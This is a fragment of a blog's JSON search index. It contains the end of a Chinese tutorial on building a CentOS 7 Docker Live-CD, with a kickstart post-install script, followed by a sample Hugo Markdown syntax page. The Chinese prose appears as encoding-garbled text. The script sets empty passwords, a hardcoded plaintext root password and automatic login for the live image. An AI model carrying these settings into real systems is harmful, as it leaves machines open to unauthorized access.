EncDocker\u0026#34; 164 dockerdev=/dev/mapper/EncDocker 165 fi 166 167 # and finally do the mount 168 mount \\$mountopts \\$dockerdev /var/lib/docker 169 # if we have /home under what\u0026#39;s passed for persistent home, then 170 # we should make that the real /home. useful for mtd device on olpc 171 if [ -d /var/lib/docker/docker ]; then mount --bind /var/lib/docker/docker /var/lib/docker ; fi 172 [ -x /sbin/restorecon ] \u0026amp;\u0026amp; /sbin/restorecon /var/lib/docker 173} 174 175findDockerDisk() { 176 for arg in \\`cat /proc/cmdline\\` ; do 177 if [ \u0026#34;\\${arg##dockerdisk=}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then 178 dockerdev=\\${arg##dockerdisk=} 179 return 180 fi 181 done 182} 183 184if strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; dockerdisk= ; then 185 findDockerDisk 186elif [ -e /run/initramfs/live/\\${livedir}/docker.img ]; then 187 dockerdev=/run/initramfs/live/\\${livedir}/docker.img 188fi 189 190# if we have a persistent /home, then we want to go ahead and mount it 191if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; nodockerdisk \u0026amp;\u0026amp; [ -n \u0026#34;\\$dockerdev\u0026#34; ] ; then 192 action \u0026#34;Mounting persistent /var/lib/docker\u0026#34; mountDockerDisk 193fi 194 195# make it so that we don\u0026#39;t do writing to the overlay for things which 196# are just tmpdirs/caches 197mount -t tmpfs -o mode=0755 varcacheyum /var/cache/yum 198mount -t tmpfs vartmp /var/tmp 199[ -x /sbin/restorecon ] \u0026amp;\u0026amp; /sbin/restorecon /var/cache/yum /var/tmp \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 200 201if [ -n \u0026#34;\\$configdone\u0026#34; ]; then 202 exit 0 203fi 204 205# add fedora user with no passwd 206action \u0026#34;Adding live user\u0026#34; useradd \\$USERADDARGS -c \u0026#34;Live System User\u0026#34; liveuser 207passwd -d liveuser \u0026gt; /dev/null 208usermod -aG wheel,docker liveuser \u0026gt; /dev/null 209 210# Remove root password lock 211passwd -d root \u0026gt; /dev/null 212(echo Kalaisadog2021; echo Kalaisadog2021)|passwd root --stdin 213 214# turn off firstboot for livecd boots 215systemctl --no-reload disable firstboot-text.service 2\u0026gt; /dev/null || : 216systemctl --no-reload disable firstboot-graphical.service 2\u0026gt; /dev/null || : 217systemctl stop firstboot-text.service 2\u0026gt; /dev/null || : 218systemctl stop firstboot-graphical.service 2\u0026gt; /dev/null || : 219 220# don\u0026#39;t use prelink on a running live image 221sed -i \u0026#39;s/PRELINKING=yes/PRELINKING=no/\u0026#39; /etc/sysconfig/prelink \u0026amp;\u0026gt;/dev/null || : 222 223# turn off mdmonitor by default 224systemctl --no-reload disable mdmonitor.service 2\u0026gt; /dev/null || : 225systemctl --no-reload disable mdmonitor-takeover.service 2\u0026gt; /dev/null || : 226systemctl stop mdmonitor.service 2\u0026gt; /dev/null || : 227systemctl stop mdmonitor-takeover.service 2\u0026gt; /dev/null || : 228 229# don\u0026#39;t enable the gnome-settings-daemon packagekit plugin 230gsettings set org.gnome.settings-daemon.plugins.updates active \u0026#39;false\u0026#39; || : 231 232# don\u0026#39;t start cron/at as they tend to spawn things which are 233# disk intensive that are painful on a live image 234systemctl --no-reload disable crond.service 2\u0026gt; /dev/null || : 235systemctl --no-reload disable atd.service 2\u0026gt; /dev/null || : 236systemctl stop crond.service 2\u0026gt; /dev/null || : 237systemctl stop atd.service 2\u0026gt; /dev/null || : 238 239# Mark things as configured 240touch /.liveimg-configured 241 242# add static hostname to work around xauth bug 243# https://bugzilla.redhat.com/show_bug.cgi?id=679486 244echo \u0026#34;localhost\u0026#34; \u0026gt; /etc/hostname 245 246# Fixing the lang install issue when other lang than English is selected . See http://bugs.centos.org/view.php?id=7217 247/usr/bin/cp /usr/lib/python2.7/site-packages/blivet/size.py /usr/lib/python2.7/site-packages/blivet/size.py.orig 248/usr/bin/sed -i \u0026#34;s#return self.humanReadable()#return self.humanReadable().encode(\u0026#39;utf-8\u0026#39;)#g\u0026#34; /usr/lib/python2.7/site-packages/blivet/size.py 249 250EOF 251 252# bah, hal starts way too late 253cat \u0026gt; /etc/rc.d/init.d/livesys-late \u0026lt;\u0026lt; EOF 254#!/bin/bash 255# 256# live: Late init script for live image 257# 258# chkconfig: 345 99 01 259# description: Late init script for live image. 260 261. /etc/init.d/functions 262 263if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; rd.live.image || [ \u0026#34;\\$1\u0026#34; != \u0026#34;start\u0026#34; ] || [ -e /.liveimg-late-configured ] ; then 264 exit 0 265fi 266 267exists() { 268 which \\$1 \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || return 269 \\$* 270} 271 272touch /.liveimg-late-configured 273 274# read some variables out of /proc/cmdline 275for o in \\`cat /proc/cmdline\\` ; do 276 case \\$o in 277 ks=*) 278 ks=\u0026#34;--kickstart=\\${o#ks=}\u0026#34; 279 ;; 280 xdriver=*) 281 xdriver=\u0026#34;\\${o#xdriver=}\u0026#34; 282 ;; 283 esac 284done 285 286# if liveinst or textinst is given, start anaconda 287if strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; liveinst ; then 288 plymouth --quit 289 /usr/sbin/liveinst \\$ks 290fi 291if strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; textinst ; then 292 plymouth --quit 293 /usr/sbin/liveinst --text \\$ks 294fi 295 296# configure X, allowing user to override xdriver 297if [ -n \u0026#34;\\$xdriver\u0026#34; ]; then 298 cat \u0026gt; /etc/X11/xorg.conf.d/00-xdriver.conf \u0026lt;\u0026lt;FOE 299Section \u0026#34;Device\u0026#34; 300 Identifier \u0026#34;Videocard0\u0026#34; 301 Driver \u0026#34;\\$xdriver\u0026#34; 302EndSection 303FOE 304fi 305 306EOF 307 308chmod 755 /etc/rc.d/init.d/livesys 309/sbin/restorecon /etc/rc.d/init.d/livesys 310/sbin/chkconfig --add livesys 311 312chmod 755 /etc/rc.d/init.d/livesys-late 313/sbin/restorecon /etc/rc.d/init.d/livesys-late 314/sbin/chkconfig --add livesys-late 315 316# enable tmpfs for /tmp 317systemctl enable tmp.mount 318 319 320# enable docker 321systemctl enable docker.service 322 323# work around for poor key import UI in PackageKit 324rm -f /var/lib/rpm/__db* 325releasever=$(rpm -q --qf \u0026#39;%{version}\\n\u0026#39; --whatprovides system-release) 326basearch=$(uname -i) 327rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-$releasever-$basearch 328echo \u0026#34;Packages within this LiveCD\u0026#34; 329rpm -qa 330# Note that running rpm recreates the rpm db files which aren\u0026#39;t needed or wanted 331rm -f /var/lib/rpm/__db* 332 333# go ahead and pre-make the man -k cache (#455968) 334/usr/bin/mandb 335 336# save a little bit of space at least... 337rm -f /boot/initramfs* 338# make sure there aren\u0026#39;t core files lying around 339rm -f /core* 340 341# convince readahead not to collect 342# FIXME: for systemd 343 344cat \u0026gt;\u0026gt; /etc/rc.d/init.d/livesys \u0026lt;\u0026lt; EOF 345 346 347# disable updates plugin 348cat \u0026gt;\u0026gt; /usr/share/glib-2.0/schemas/org.gnome.settings-daemon.plugins.updates.gschema.override \u0026lt;\u0026lt; FOE 349[org.gnome.settings-daemon.plugins.updates] 350active=false 351FOE 352 353# Show the system-config-keyboard tool on the desktop 354mkdir /home/liveuser/Desktop -p \u0026gt;/dev/null 355cat /usr/share/applications/system-config-keyboard.desktop | sed \u0026#39;/NotShowIn/d\u0026#39; |sed \u0026#39;s/Terminal=false/Terminal=true/\u0026#39; \u0026gt; /home/liveuser/Desktop/system-config-keyboard.desktop 356cat /usr/share/applications/liveinst.desktop | sed \u0026#39;/NoDisplay/d\u0026#39; \u0026gt; /home/liveuser/Desktop/liveinst.desktop 357chmod +x /home/liveuser/Desktop/*.desktop 358chown -R liveuser:liveuser /home/liveuser 359 360# Liveuser face 361if [ -e /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png ] ; then 362 cp /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png /home/liveuser/.face 363 chown liveuser:liveuser /home/liveuser/.face 364fi 365 366# make the installer show up 367if [ -f /usr/share/applications/liveinst.desktop ]; then 368 # Show harddisk install in shell dash 369 sed -i -e \u0026#39;s/NoDisplay=true/NoDisplay=false/\u0026#39; /usr/share/applications/liveinst.desktop 370 # need to move it to anaconda.desktop to make shell happy 371 #cp /usr/share/applications/liveinst.desktop /usr/share/applications/anaconda.desktop 372fi 373 cat \u0026gt;\u0026gt; /usr/share/glib-2.0/schemas/org.gnome.shell.gschema.override \u0026lt;\u0026lt; FOE 374[org.gnome.shell] 375favorite-apps=[\u0026#39;liveinst.desktop\u0026#39;,\u0026#39;firefox.desktop\u0026#39;, \u0026#39;evolution.desktop\u0026#39;, \u0026#39;empathy.desktop\u0026#39;, \u0026#39;rhythmbox.desktop\u0026#39;, \u0026#39;shotwell.desktop\u0026#39;, \u0026#39;libreoffice-writer.desktop\u0026#39;, \u0026#39;nautilus.desktop\u0026#39;, \u0026#39;gnome-documents.desktop\u0026#39;, \u0026#39;anaconda.desktop\u0026#39;] 376FOE 377 378 379# set up auto-login 380cat \u0026gt; /etc/gdm/custom.conf \u0026lt;\u0026lt; FOE 381[daemon] 382AutomaticLoginEnable=True 383AutomaticLogin=liveuser 384FOE 385 386# Turn off PackageKit-command-not-found while uninstalled 387if [ -f /etc/PackageKit/CommandNotFound.conf ]; then 388 sed -i -e \u0026#39;s/^SoftwareSourceSearch=true/SoftwareSourceSearch=false/\u0026#39; /etc/PackageKit/CommandNotFound.conf 389fi 390 391# make sure to set the right permissions and selinux contexts 392chown -R liveuser:liveuser /home/liveuser/ 393restorecon -R /home/liveuser/ 394 395# Fixing default locale to us 396localectl set-keymap us 397localectl set-x11-keymap us 398EOF 399 400 401# rebuild schema cache with any overrides we installed 402glib-compile-schemas /usr/share/glib-2.0/schemas 403 404 405%end æ³¨æ„ï¼Œä¸Šé¢æ³¨é‡Šäº†ä¸¤ä¸ªåœ°æ–¹ï¼Œéƒ½å¯ä»¥æ·»åŠ è½¯ä»¶æˆ–è€…è¿è¡Œè„šæœ¬\nä¸‰ã€buildå‡ºisoæ–‡ä»¶ 1livecd-creator --verbose -c centos7-live-docker.ks --cache=cache -f centos7-live-docker ç„¶åå°±ä¼šå¾—åˆ°centos7-live-docker.isoçš„æ–‡ä»¶ï¼Œæ³¨æ„åœ¨buildè¿‡ç¨‹ä¸­çš„æŠ¥é”™ä¿¡æ¯ï¼Œå¤šæ•°æ˜¯æ— æ³•ä¸‹è½½åŒ…å¯¼è‡´çš„ã€‚\nç›´æ¥åŠ è½½ISOæ–‡ä»¶å¯åŠ¨æˆ–è€…åˆ»å½•åˆ°USBä¸Šå¯åŠ¨ï¼Œå°±å¯ä»¥è¿›å…¥è¿™ä¸ªè‡ªåˆ¶çš„Liveç³»ç»Ÿäº†\nåƒä¸‡æ³¨æ„ï¼Œå¯åŠ¨ä¸€å®šè¦é€‰Bios legacyï¼Œä¸è¦ç”¨Uefiã€‚\nç›¸å…³ä¸€äº›æœ‰ç”¨çš„é“¾æ¥ï¼š\nhttps://github.com/minishift/minishift-centos-iso https://github.com/livecd-tools/livecd-tools https://blog.csdn.net/sharpbladepan/article/details/107423468 ","date":"2021-10-10","img":"","permalink":"https://rendoumi.com/posts/20211010-live_cd/","series":null,"tags":null,"title":"CentOS 7 Live-CD çš„åˆ¶ä½œ"},{"categories":[],"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;â€”\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating. â€” Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code Code Blocks Code block with backticks 1\u0026lt;!doctype html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; 5 \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; 6\u0026lt;/head\u0026gt; 7\u0026lt;body\u0026gt; 8 \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; 9\u0026lt;/body\u0026gt; 10\u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1\u0026lt;!doctype html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; 5 \u0026lt;title\u0026gt;Another Example HTML5 Document\u0026lt;/title\u0026gt; 6\u0026lt;/head\u0026gt; 7\u0026lt;body\u0026gt; 8 \u0026lt;p\u0026gt;A looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooong text\u0026lt;/p\u0026gt; 9\u0026lt;/body\u0026gt; 10\u0026lt;/html\u0026gt; List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested List Fruit Apple Orange Banana Dairy Milk Cheese TODO List Done WIP Other Elements â€” abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nThe above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2020-11-09","img":"https://rendoumi.com/images/markdown.png","permalink":"https://rendoumi.com/posts/markdown-syntax/","series":["Manual"],"tags":["Markdown","CSS","HTML"],"title":"Markdown Syntax Guide"}]